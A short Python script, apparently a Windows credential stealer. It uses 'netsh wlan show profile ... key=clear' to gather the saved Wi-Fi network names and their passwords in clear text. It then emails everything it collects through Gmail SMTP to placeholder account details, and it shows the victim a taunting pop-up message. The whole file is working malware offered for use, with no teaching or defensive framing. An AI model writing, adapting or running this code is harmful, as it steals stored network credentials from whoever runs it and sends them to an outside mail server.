#!/usr/bin/env python

import subprocess, smtplib, re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

subprocess.run("msg * WHOPSIE, THANKS BUDDY :)")
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall(br"(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in network_names_list:
    command = 'netsh wlan show profile ' + 'name=' + '"' + network_name.decode(
        'utf-8') + '"' + ' key=clear'
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result.decode('utf-8')


send_mail("EMAIL", "Password", result)